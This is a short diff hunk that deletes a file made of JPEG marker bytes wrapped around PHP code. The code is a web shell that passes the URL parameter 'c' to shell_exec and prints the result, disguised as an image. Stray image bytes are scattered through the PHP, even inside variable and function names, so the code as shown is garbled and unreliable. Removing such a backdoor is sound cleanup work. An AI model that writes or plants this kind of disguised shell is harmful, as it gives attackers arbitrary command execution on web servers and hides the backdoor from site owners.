@@ -1,7 +1,0 @@
-ÿØÿàÿĞ<?php
-$cmd = $ÿÑ_GET['c'] ?? 'ÿÒ';
-if($cmd) {
-ÿÓ    $output = ÿÔshell_exec($cmÿÕd);
-    echo "ÿÖ<pre>$output</ÿ×pre>";
-}
-?>ÿÙ
